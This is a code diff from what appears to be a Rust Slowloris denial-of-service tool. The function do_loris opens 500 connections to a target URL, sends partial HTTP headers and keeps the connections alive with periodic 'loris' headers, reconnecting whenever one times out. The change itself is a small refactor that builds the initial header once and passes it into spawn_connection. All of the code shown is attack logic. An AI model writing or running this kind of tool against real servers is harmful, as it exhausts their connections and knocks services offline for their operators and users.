@@ -52,8 +52,9 @@ pub fn do_loris(url: &str) {
     let url = Url::parse(url).unwrap();
 
     let connection_num = 500;
+    let init_header = get_init_header(&url);
     let mut connections: Vec<_> = (0..connection_num)
-        .map(|_| spawn_connection(&url))
+        .map(|_| spawn_connection(&url, &init_header))
         .collect();
 
     let timeout = 4000;
@@ -64,7 +65,7 @@ pub fn do_loris(url: &str) {
             let res = connection.write_all(&loris_header);
             if res.is_err() {
                 println!("Timeout, reseting connection...");
-                let mut new_connection = spawn_connection(&url);
+                let mut new_connection = spawn_connection(&url, &init_header);
                 std::mem::swap(connection, &mut new_connection);
             }
         }
@@ -86,9 +87,8 @@ fn get_stream(url: &Url) -> Stream<TcpStream> {
     }
 }
 
-fn spawn_connection(url: &Url) -> Stream<TcpStream> {
+fn spawn_connection(url: &Url, init_header: &[u8]) -> Stream<TcpStream> {
     let mut stream = get_stream(&url);
-    let init_header = get_init_header(&url);
     stream.write_all(&init_header).unwrap();
     stream
 }
